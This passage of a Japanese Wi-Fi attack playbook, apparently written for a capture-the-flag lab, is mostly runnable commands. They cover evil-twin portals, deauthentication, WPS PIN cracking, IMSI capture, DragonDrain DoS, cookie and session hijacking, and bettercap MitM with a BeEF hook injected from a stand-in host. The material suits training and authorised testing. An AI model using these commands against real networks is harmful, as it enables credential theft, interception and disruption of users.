  bssid_blacklist=F0:9F:C2:00:00:00   # ← 自分の偽 AP を無視
}
```

### 8.7. air-hammer によるブルートフォース

```bash
cd ~/tools/air-hammer

# 方法 1: 1 ユーザー + パスワードリスト
echo 'CONTOSO\test' > test.user
python2 ./air-hammer.py -i wlan3 -e wifi-corp -p rockyou.txt -u test.user

# 方法 2: ユーザーリスト + 1 パスワード (Password Spray)
cat /root/top-usernames-shortlist.txt | awk '{print "CONTOSO\\" $1}' > users.txt
python2 ./air-hammer.py -i wlan4 -e wifi-corp -P 12345678 -u users.txt
```

### 8.8. Evil Twin + フィッシング (Hostile Portal)

**シナリオ:** クライアントが別ネットワークを Probe 送信。

```bash
# 1. Hostile Portal で Rogue AP を実行
cd ~/tools/eaphammer
sudo python3 ./eaphammer --essid "WiFi-Restaurant" --interface wlan2 --hostile-portal

# 2. クライアントに Deauth
sudo aireplay-ng --ignore-negative-one -0 0 \
  -a F0:9F:C2:71:22:17 -c 64:32:A8:BC:53:51 wlan0mon

# 3. NetNTLMv2 を抽出
cd ~/tools/eaphammer
cat logs/Responder-Session.log | grep NTLMv2 | grep Hash | awk '{print $9}' > responder.5600

# 4. クラック
hashcat -a 0 -m 5600 responder.5600 rockyou.txt --force
```

**または Captive Portal で:**
```bash
sudo python3 ./eaphammer --essid "WiFi-Restaurant" --interface wlan4 --captive-portal

# POST をスニッフィング
sudo tshark -i wlan4 -Y "http.request.method == \"POST\"" -T fields -e http.file_data
# 出力: username=CORPO\god&password=tommy1
```

### 8.9. IMSI 抽出 (EAP-SIM/AKA/AKA')

```bash
# 1. パッシブ: Identity を確認
sudo airodump-ng wlan0mon -c 48 --bssid F0:9F:C2:71:22:19 -w recon
tshark -r recon-01.cap -Y "eap.identity" -T fields -e eap.identity
# 出力: 6214070028194561@wlan.mnc007.mcc214.wifichallenge.com

# 2. 正確なメソッドを特定
tshark -r recon-01.cap -Y "eap.type == 3" -V | grep "Desired Auth Type"
# 出力: Desired Auth Type: UMTS Authentication and Key Agreement' EAP (EAP-AKA') (50)

# 3. AKA' で hostapd を構築
nano /etc/hostapd.eap_user
# 内容 (TAB あり):
# *	AKA'

nano hostapd-imsi.conf
```

```conf
interface=wlan4
driver=nl80211
ssid=wifi-passpoint
channel=48
hw_mode=a
auth_algs=1
wpa=2
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP
ieee8021x=1
eap_server=1
eap_sim_id=0
eap_sim_db=file:/tmp/sim_db
eap_user_file=/etc/hostapd.eap_user
eap_sim_aka_result_ind=1
```

```bash
# 4. 偽の sim_db を構築
echo "001010000000001 00000000000000000000000000000000 00000000000000000000000000000000" | sudo tee /tmp/sim_db

# 5. hostapd を実行
sudo hostapd ~/wifi/hostapd-imsi.conf

# 6. 並列スニッフィング
sudo tshark -i wlan1mon -w /tmp/imsi.pcap

# 7. Deauth
sudo aireplay-ng --ignore-negative-one -0 10 -a F0:9F:C2:71:22:19 -c 64:32:A8:BA:18:60 wlan1mon

# 8. IMSI を抽出
sudo tshark -r /tmp/imsi.pcap -Y "eap.type == 50" -V | grep -iE "Identity|IMSI"
```

**出力:**
```
Identity: 6214070028194561@wlan.mnc007.mcc214.wifichallenge.com
```

**最終 IMSI (プレフィックス 6 を削除):** `214070028194561`

---

<a name="owe"></a>
## 9. フェーズ 6: OWE ブランチ (Enhanced Open)

```
OWE (ENC=WPA3, AUTH=OWE)
│
├── 直接接続 (99% 成功)
│   ├── key_mgmt=OWE, ieee80211w=2
│   ├── wpa_supplicant + dhclient
│   └── admin/admin → フラグ
│
└── 失敗した場合:
    ├── DragonDrain (OWE handshake への DoS)
    │   └── dragondrain -d wlan1mon -a <BSSID> -c 44 -r 200
    │
    └── リトライ
```

### 9.1. OWE への接続

```conf
# gratis.conf
network={
    ssid="wifi-gratis"
    key_mgmt=OWE
    ieee80211w=2
    scan_ssid=1
}
```

```bash
sudo wpa_supplicant -Dnl80211 -i wlan3 -c gratis.conf -B
sudo dhclient wlan3 -v
```

### 9.2. DragonDrain (接続失敗時)

```bash
cd /root/tools/dragondrain-and-time/
autoreconf -i && ./configure && make
cd src/
sudo ./dragondrain -d wlan1mon -a F0:9F:C2:71:AF:2F -c 44 -b 54 -n 1 -r 200
```

---

<a name="wps"></a>
## 10. フェーズ 7: WPS ブランチ

```
WPS (WPS カラム = 2.0)
│
├── 1. WPS ステータスを確認
│   └── wash -i wlan0mon -c <CH>
│       ├── Lck = No → 続行
│       └── Lck = Yes → reaver -L (ロックを無視)
│
├── 2. Pixie Dust (最速)
│   └── reaver -i wlan0mon -b <BSSID> -c <CH> -vv -K 1
│       ├── 成功 → パスワード + PIN
│       └── 失敗 → PIN ブルートフォース
│
└── 3. PIN ブルートフォース
    └── reaver -i wlan0mon -b <BSSID> -c <CH> -vv -S -N -L
        ├── WPS PIN: 12345670
        ├── WPA PSK: @MegaPSKP@ssword!@
        └── PSK 設定で接続
```

### 10.1. WPS の確認

```bash
sudo wash -i wlan0mon -c 8
```

**出力:**
```
BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
F0:9F:C2:71:22:13    8  -30  2.0  No             wifi-event
```

| カラム | 意味 | 値 |
|------|------|-------|
| WPS | バージョン | `2.0` = 有効 |
| Lck | ロック済み | `No` = 攻撃可能 |

### 10.2. Pixie Dust

```bash
sudo reaver -i wlan0mon -b F0:9F:C2:71:22:13 -c 8 -vv -K 1
```

### 10.3. PIN ブルートフォース

```bash
sudo reaver -i wlan0mon -b F0:9F:C2:71:22:13 -c 8 -vv -S -N -L
```

**成功時の出力:**
```
[+] WPS PIN: '12345670'
[+] WPA PSK: '@MegaPSKP@ssword!@'
```

### 10.4. WPS PSK で接続

```conf
network={
    ssid="wifi-event"
    psk="@MegaPSKP@ssword!@"
}
```

---

<a name="wids"></a>
## 11. フェーズ 8: WIDS (Nzyme)

```
WIDS (Nzyme)
│
├── 1. ダッシュボードにアクセス
│   └── https://127.0.0.1:22900 (admin:admin)
│
├── 2. Alerts → 最も古いアラート
│
└── 3. Source MAC / Attacker MAC を発見
```

---

<a name="post"></a>
## 12. ポストエクスプロイテーション

```
ネットワーク接続後
│
├── 1. ネットワーク情報
│   ├── ip a show wlan3
│   ├── ip route | grep default
│   └── arp-scan -I wlan3 -l
│
├── 2. トラフィック復号 (WPA2)
│   └── airdecap-ng -e <SSID> -p <PASS> capture-01.cap
│
├── 3. 認証情報の抽出
│   ├── tshark -Y "http.request.method == POST" -T fields -e http.file_data
│   ├── tshark -Y "http.cookie" -T fields -e http.cookie
│   ├── tshark -Y "http.authorization" -T fields -e http.authorization
│   └── tshark -Y "ftp" -T fields -e ftp.request.arg
│
├── 4. Session Hijacking
│   └── curl -i -b "PHPSESSID=..." http://<gateway>/
│
├── 5. Client Isolation のテスト
│   ├── arp-scan -I wlan3 -l
│   └── curl http://<other_client>/
│
└── 6. MitM 攻撃 (Client Isolation が無効な場合)
    ├── ARP Spoofing (bettercap)
    ├── SSL Stripping (bettercap http.proxy.sslstrip)
    ├── DNS Spoofing (bettercap dns.spoof)
    └── JS Injection (BeEF)
```

### 12.1. Cookie 抽出と Session Hijacking

```bash
# 1. 復号
airdecap-ng -e wifi-mobile -p starwars1 ~/wifi/scanc6-01.cap

# 2. Cookie を抽出
tshark -r ~/wifi/scanc6-01-dec.cap -Y "http.cookie" -T fields -e http.cookie
# 出力: PHPSESSID=296228e3896440bd508d4c69e11e265c

# 3. Cookie を使用
curl -i -b "PHPSESSID=296228e3896440bd508d4c69e11e265c" http://192.168.2.1/
```

### 12.2. HTTP から認証情報を抽出

```bash
tshark -r capture-dec.cap -Y "http.request.method == \"POST\"" -T fields -e http.file_data
# 出力: Username=free1&Password=Jyl1iq8UajZ1fEK&Submit=Login
```

### 12.3. Client Isolation のテスト

```bash
# 1. IP を発見
sudo arp-scan -I wlan3 -l

# 2. アクセスをテスト
curl -s -m 3 http://192.168.2.7/ | grep -o 'flag{[^}]*}'
```

### 12.4. MitM 攻撃 (bettercap)

```bash
# IP フォワーディングを有効化
sudo sysctl -w net.ipv4.ip_forward=1

# bettercap を実行
sudo bettercap -iface eth0

# bettercap 内:
net.probe on
net.show
set arp.spoof.targets 192.168.1.50
set arp.spoof.fullduplex true
arp.spoof on
net.sniff on

# SSL Stripping
set http.proxy.sslstrip true
http.proxy on

# DNS Spoofing
set dns.spoof.address 192.168.1.100
set dns.spoof.domains google.com
dns.spoof on

# BeEF Injection
set http.proxy.injectjs http://YOUR_IP:3000/hook.js
```

---

<a name="cheatsheet"></a>
## 13. 主要コマンドチートシート

### 13.1. 偵察

```bash
# 包括的スキャン
sudo airodump-ng wlan0mon -w scan --manufacturer --wps --band abg

# ターゲットスキャン
sudo airodump-ng wlan0mon -c <CH> --bssid <BSSID> -w target

# WPS チェック
sudo wash -i wlan0mon -c <CH>

# PMF チェック
sudo iw dev wlan2 scan | grep -A 20 "SSID" | grep -A 6 "RSN"

# pcap 分析
tshark -r capture.cap -Y "wlan.fc.type_subtype == 4" -T fields -e wlan.sa -e wlan.ssid
tshark -r capture.cap -Y "eap.identity" -T fields -e eap.identity
tshark -r capture.cap -Y "eap.type" -T fields -e eap.type | sort | uniq -c
```

### 13.2. 攻撃

```bash
# Deauth
sudo aireplay-ng -0 10 -a <BSSID> -c <CLIENT> wlan0mon

# Handshake
sudo airodump-ng -c <CH> --bssid <BSSID> -w capture wlan0mon

# PMKID
sudo hcxdumptool -i wlan6mon -w pmkid.pcapng -c <CH>a --rds=2 -A

# WPS Pixie Dust
sudo reaver -i wlan0mon -b <BSSID> -c <CH> -vv -K 1

# WPS PIN ブルートフォース
sudo reaver -i wlan0mon -b <BSSID> -c <CH> -vv -S -N -L

# WEP 自動
sudo besside-ng -c <CH> -b <BSSID> wlan2 -v

# WEP 手動
sudo aireplay-ng -1 3600 -q 10 -a <BSSID> wlan0mon
sudo aireplay-ng --arpreplay -b <BSSID> -h <YOUR_MAC> wlan0mon
sudo aircrack-ng capture-01.cap

# wacker.py (WPA3)
./wacker.py --wordlist rockyou.txt --ssid <SSID> --bssid <BSSID> \
            --interface wlan2 --freq 2462

# DragonDrain (OWE/WPA3 DoS)
sudo ./dragondrain -d wlan1mon -a <BSSID> -c <CH> -b 54 -n 1 -r 200
```

### 13.3. クラッキング

```bash
# WPA2 (Handshake/PMKID)
hashcat -m 22000 -a 0 hash.22000 rockyou.txt --force
aircrack-ng capture-01.cap -w rockyou.txt

# WEP
aircrack-ng wep-01.cap

# EAP-MD5
hcxpcapngtool --eapmd5=legacy.hc4800 capture.cap
hashcat -m 4800 -a 0 legacy.hc4800 rockyou.txt

# MSCHAPv2
asleap -C <CHALLENGE> -R <RESPONSE> -W rockyou.txt
hashcat -m 5500 hash.5500 rockyou.txt

# NetNTLMv2
hashcat -m 5600 hash.5600 rockyou.txt
```

### 13.4. 接続

```bash
# OPN
wpa_supplicant -Dnl80211 -iwlan2 -c open.conf
dhclient wlan2 -v

# WEP
wpa_supplicant -Dnl80211 -iwlan2 -c wep.conf
dhclient wlan2 -v

# WPA2-PSK
wpa_supplicant -Dnl80211 -iwlan3 -c psk.conf
dhclient wlan3 -v

# WPA3-SAE
wpa_supplicant -i wlan2 -c wpa3.conf

# WPA2-Enterprise (PEAP)
wpa_supplicant -Dnl80211 -iwlan3 -c corp.conf -B
dhclient wlan3 -v

# OWE
wpa_supplicant -Dnl80211 -i wlan3 -c gratis.conf -B
```

### 13.5. ポストエクスプロイト

```bash
# 復号
airdecap-ng -e <SSID> -p <PASS> capture-01.cap

# Cookie を抽出
tshark -r capture-dec.cap -Y "http.cookie" -T fields -e http.cookie

# POST を抽出
tshark -r capture-dec.cap -Y "http.request.method == POST" -T fields -e http.file_data

# Session Hijacking
curl -i -b "PHPSESSID=..." http://<gateway>/

# Client Isolation
arp-scan -I wlan3 -l
curl http://<other_client>/
```

---

<a name="troubleshoot"></a>
## 14. よくあるトラブルシューティング表

| エラー | 原因 | 解決策 |
|------|------|--------|
| `failed to arm interface` | 共有インターフェース | `iw phy phy70 interface add wlan6mon type monitor` |
| `fixed channel -1` | チャンネル未設定 | `sudo ip link set wlan0mon down; sudo iw dev wlan0mon set channel 44; sudo ip link set wlan0mon up` |
| `unknown CA` | クライアントが証明書を検証 | `--negotiate gtc-downgrade` または本物の証明書をインポート |
| `Supplicant used different EAP type` | 間違ったメソッド | `tshark -Y "eap.type == 3" -V` → `Desired Auth Type` を確認 |
| `WPS pin not found` | Pixie Dust 失敗 | `reaver -S -N -L` (PIN ブルートフォース) |
| `Lck: Yes` (WPS Locked) | WPS ロック | `reaver -L` または待機 |
| `file corrupt` (hashcat) | ハッシュフォーマット | `hcxhash2cap --hccapx=... -c aux.pcap` → `hcxpcapngtool` |
| `RSA key ok` (パスワードなし) | パスワードなしキー | `--private-key-passwd` を削除 |
| `create_ap.all.lock` | 前のプロセス | `sudo rm -f /tmp/create_ap.all.lock` |
| `Address already in use` (ポート 80) | Apache/nginx | `sudo fuser -k 80/tcp` |
| `wpa_supplicant` ハング | スタックしたプロセス | `sudo pkill wpa_supplicant; sudo ip link set wlan3 down; sleep 2; up` |
| `dhclient` タイムアウト | DHCP 応答なし | `sudo dhclient -v -r wlan3` でリトライ |

### 14.1. 高度なトラブルシューティング

```bash
# インターフェースの状態確認
iw dev wlan0mon info
iwconfig wlan0mon

# チャンネル確認
sudo iw dev wlan0mon set channel 44
iw dev wlan0mon info | grep channel

# 干渉確認
sudo airmon-ng check
sudo airmon-ng check kill

# 完全リセット
sudo pkill wpa_supplicant
sudo pkill dhclient
sudo pkill hostapd
sudo pkill dnsmasq
sudo airmon-ng check kill
sudo ip link set wlan0 down
sudo ip link set wlan0 up
```

---

<a name="checklist"></a>
## 15. 最終チェックリスト

### テスト前:
- [ ] 無線カードがモニターモードでテスト済み
- [ ] すべてのツールがインストール済み: `aircrack-ng`, `hashcat`, `hcxdumptool`, `reaver`, `eaphammer`, `hostapd-mana`, `wacker`, `air-hammer`, `berate_ap`, `wpa_sycophant`, `tshark`
- [ ] ワードリスト準備完了: `/root/rockyou-top100000.txt`
- [ ] `airmon-ng check kill` の動作を理解している

### テスト中:
- [ ] `airodump-ng --band abg` を実行した (2.4GHz だけでなく)
- [ ] ターゲットチャンネルと BSSID を記録した
- [ ] 暗号化と AUTH タイプを特定した
- [ ] `wash` で WPS を確認した
- [ ] `iw scan` で PMF を確認した
- [ ] MGT の場合、`eap.type` を抽出した
- [ ] クラック後に `airdecap-ng` を実行した
- [ ] トラフィックから Cookie/Credential を抽出した
- [ ] `ip route` を実行してゲートウェイを発見した
- [ ] Client Isolation のために `arp-scan` を実行した

### 黄金律:
1. **自動化ツール禁止!** (`wifite`, `wifiphisher` は禁止、`besside-ng` は WEP のみ)
2. **常にチャンネルをロック** (`-c <CH>`)
3. **PMKID は Handshake より速い**
4. **WPS を確認** (最速パス)
5. **攻撃前にリセット** (`pkill`, `airmon-ng check kill`)
6. **接続ごとに `ip route` を実行**
7. **すべての pcap を tshark で分析** (Identity, Certificate, Cookie)

---

<a name="comparison"></a>
## 16. 攻撃比較表

| ネットワーク種別 | 主要メソッド | ツール | 所要時間 | 難易度 |
|----------|----------|-------|------|------|
| **OPN** | 直接接続 | `wpa_supplicant` | 1 分 | ⭐ |
| **OPN + Portal** | MAC Spoofing | `macchanger` + `tshark` | 5 分 | ⭐⭐ |
| **WEP** | besside-ng | `besside-ng` | 5〜10 分 | ⭐ |
| **WEP** | 手動 | `aireplay-ng` + `aircrack` | 15〜30 分 | ⭐⭐ |
| **WPA2 + Client** | Deauth + Handshake | `aireplay-ng` + `hashcat` | 2〜5 分 | ⭐⭐ |
| **WPA2 クライアントなし** | PMKID | `hcxdumptool` + `hashcat` | 1〜3 分 | ⭐ |
| **WPA2 不在 + Probe** | Rogue AP | `hostapd-mana` | 5〜10 分 | ⭐⭐⭐ |
| **WPA3 Transition** | ダウングレード | `hostapd-mana` | 5 分 | ⭐⭐⭐ |
| **WPA3-only** | wacker.py | `wacker` | 30〜60 分 | ⭐⭐⭐⭐ |
| **WPS** | Pixie Dust | `reaver -K 1` | 10 秒 | ⭐ |
| **WPS** | PIN ブルートフォース | `reaver -S -N -L` | 1〜4 時間 | ⭐⭐⭐ |
| **MGT + MD5** | パッシブ + クラック | `hcxpcapngtool` | 1 分 | ⭐ |
| **MGT + PEAP** | Evil Twin | `eaphammer` | 5〜15 分 | ⭐⭐⭐ |
| **MGT + PEAP** | Relay | `berate_ap` + `sycophant` | 10 分 | ⭐⭐⭐⭐ |
| **MGT + TLS** | 偽証明書 | `openssl` + `eaphammer` | 5 分 | ⭐⭐⭐⭐ |
| **MGT + SIM** | IMSI 抽出 | `hostapd` | 5 分 | ⭐⭐⭐ |
| **OWE** | 直接接続 | `wpa_supplicant` | 1 分 | ⭐ |
| **OWE** | DragonDrain | `dragondrain` | 5 分 | ⭐⭐⭐ |

---

2026/11/06
